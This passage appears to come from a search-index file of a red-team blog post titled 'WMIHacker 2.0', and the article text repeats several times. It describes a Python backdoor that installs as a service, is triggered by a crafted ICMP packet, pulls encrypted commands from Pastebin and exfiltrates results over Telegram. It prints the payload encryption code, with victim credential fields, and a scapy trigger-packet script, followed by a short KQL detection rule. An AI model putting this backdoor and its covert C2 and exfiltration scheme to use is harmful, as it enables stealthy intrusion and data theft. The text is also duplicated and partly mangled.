Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\nresult = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) Generate encrypted payload which will be placed in Pastebin.com\nvictim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) Generate encrypted payload which will be placed in Pastebin.com\nvictim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) Generate encrypted payload which will be placed in Pastebin.com\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) Generate encrypted payload which will be placed in Pastebin.com\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and 